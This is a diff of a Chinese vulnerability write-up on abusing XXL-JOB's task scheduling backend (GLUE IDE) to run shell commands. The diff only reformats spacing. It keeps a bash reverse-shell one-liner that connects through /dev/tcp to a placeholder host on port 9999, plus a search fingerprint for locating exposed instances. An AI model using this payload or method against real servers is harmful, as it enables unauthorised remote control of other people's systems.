@@ -2,7 +2,7 @@
 
 ## 漏洞描述
 
-XXL-JOB 任务调度中心攻击者可以在后台可以通过写入shell命令任务调度获取服务器权限
+XXL-JOB 任务调度中心攻击者可以在后台可以通过写入 shell 命令任务调度获取服务器权限
 
 ## 漏洞影响
 
@@ -28,31 +28,19 @@ app="XXL-JOB" || title="任务调度中心"
 
 ![](images/202202101915543.png)
 
-点击 GLUE IDE编辑脚本
-
-
+点击 GLUE IDE 编辑脚本
 
 ![](images/202202101915236.png)
 
-
-
 ![](images/202202101915343.png)
-
-
 
 执行探测出网，和任务调用是否可执行
 
-
-
-反弹一个shell
-
-
+反弹一个 shell
 
 ```plain
 #!/bin/bash
 bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'
 ```
-
-
 
 ![](images/202202101915912.png)
